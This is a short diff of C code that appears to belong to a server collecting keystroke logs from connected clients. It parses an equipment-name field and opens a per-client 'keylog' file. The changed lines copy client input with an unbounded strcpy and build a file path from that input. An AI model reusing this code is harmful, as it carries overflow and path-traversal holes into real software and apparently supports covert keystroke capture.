@@ -38,7 +38,17 @@ void handleOpcode(message_t msg, int clientSock)
         break;
 
     case 'U':
-        strcpy(clientHndler.clientsAttr[clientSock].name, msg.buffer);
+        char *p = strtok(msg.buffer, " =\n");
+        while (p)
+        {
+            if (strcmp(p, "Nume_Echipament") == 0)
+            {
+                p = strtok(NULL, "= \n");
+                strcpy(clientHndler.clientsAttr[clientSock].name, p);
+            }
+            p = strtok(NULL, "= \n");
+        }
+
         snprintf(filename, sizeof(filename), "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
 
         clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
